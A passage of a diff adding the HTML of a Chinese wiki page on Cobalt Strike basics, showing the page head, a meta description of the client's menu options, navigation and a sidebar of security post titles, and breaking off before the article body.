@@ -1,0 +1,1042 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+    <title>1-Cobalt Strike基础上篇 | Tahir&#39;s Wiki</title>
+    
+    
+        <meta name="keywords" content="Cobalt Strike">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="[TOC] by Tahir 2021.6.8 1.Cobalt Strike 模块详解1.1 Cobalt Strike 模块Cobalt Strike 模块的功能选项，如下图。   New Connection：打开一个新的”Connect”窗口。在当前窗口中新建一个连接，即可同时连接不同的团队服务器( 便于团队之间的协作)。 Preferences：偏好设置，首选项，用于设置Cobalt S">
+<meta property="og:type" content="article">
+<meta property="og:title" content="1-Cobalt Strike基础上篇">
+<meta property="og:url" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/index.html">
+<meta property="og:site_name" content="Tahir&#39;s Wiki">
+<meta property="og:description" content="[TOC] by Tahir 2021.6.8 1.Cobalt Strike 模块详解1.1 Cobalt Strike 模块Cobalt Strike 模块的功能选项，如下图。   New Connection：打开一个新的”Connect”窗口。在当前窗口中新建一个连接，即可同时连接不同的团队服务器( 便于团队之间的协作)。 Preferences：偏好设置，首选项，用于设置Cobalt S">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/1.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/2.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/3.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/4.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/5.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/6.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/7.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/8.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/9.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/10.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/11.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/12.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/13.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/14.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/15.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/16.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/17.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/18.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/19.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/20.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/21.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/22.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/24.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/26.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/27.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/28.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/29.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/30.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/31.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/32.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/33.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/34.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/35.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/36.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/37.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/38.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/39.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/40.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/41.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/42.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/43.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/44.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/45.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/46.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/25.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/47.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/48.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/20.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/21.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/22.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/49.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/50.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/51.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/52.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/53.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/54.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/55.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/56.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/57.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/58.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/59.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/60.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/61.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/62.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/63.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/64.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/65.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/66.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/67.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/68.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/69.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/70.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/75.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/76.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/77.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/78.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/79.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/80.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/81.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/82.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/83.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/84.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/85.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/71.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/72.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/73.png">
+<meta property="og:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/74.png">
+<meta property="article:published_time" content="2021-07-03T03:35:03.000Z">
+<meta property="article:modified_time" content="2021-07-03T03:42:22.369Z">
+<meta property="article:author" content="Tahir">
+<meta property="article:tag" content="Cobalt Strike">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/1.png">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="Tahir&#39;s Wiki" type="application/atom+xml">
+    
+
+    
+        <link rel="icon" href="/favicon.ico">
+    
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/libs/open-sans/styles.css">
+
+    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+
+    
+<script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+    
+
+
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">Tahir&#39;s Wiki</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/">首页</a>
+                
+                    <a class="main-nav-link" href="/archives">归档</a>
+                
+                    <a class="main-nav-link" href="/categories">分类</a>
+                
+                    <a class="main-nav-link" href="/tags">标签</a>
+                
+                    <a class="main-nav-link" href="/about">关于</a>
+                
+            </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search">
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something...">
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/">首页</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">归档</a></td>
+                
+                    <td><a class="main-nav-link" href="/categories">分类</a></td>
+                
+                    <td><a class="main-nav-link" href="/tags">标签</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">关于</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search">
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap" id="categories">
+        <h3 class="widget-title">
+            <span>categories</span>
+            &nbsp;
+            <a id="allExpand" href="#">
+                <i class="fa fa-angle-double-down fa-2x"></i>
+            </a>
+        </h3>
+        
+        
+        
+         <ul class="unstyled" id="tree"> 
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            威胁猎捕
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            Cobalt Strike
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/">0-Cobalt Strike零基础</a></li>  <li class="file active"><a href="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/">1-Cobalt Strike基础上篇</a></li>  <li class="file"><a href="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/">1-Cobalt Strike基础中篇</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            数据库攻防
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Oracle Database
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/">Oracle Database简单概述</a></li>  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/">Oracle Database PL/SQL注入漏洞原理</a></li>  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/">Oracle Database 11g Wrap加密解密分析</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            SQL Server
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/">SQL Server数据库攻防详解上篇</a></li>  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/">SQL Server数据库攻防详解下篇</a></li>  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/">SQL Server数据库安全加固</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                     <li class="file"><a href="/wiki/hello-world/">Hello World</a></li>  </ul> 
+    </div>
+    <script>
+        $(document).ready(function() {
+            var iconFolderOpenClass  = 'fa-folder-open';
+            var iconFolderCloseClass = 'fa-folder';
+            var iconAllExpandClass = 'fa-angle-double-down';
+            var iconAllPackClass = 'fa-angle-double-up';
+            // Handle directory-tree expansion:
+            // 左键单独展开目录
+            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
+                event.preventDefault();
+
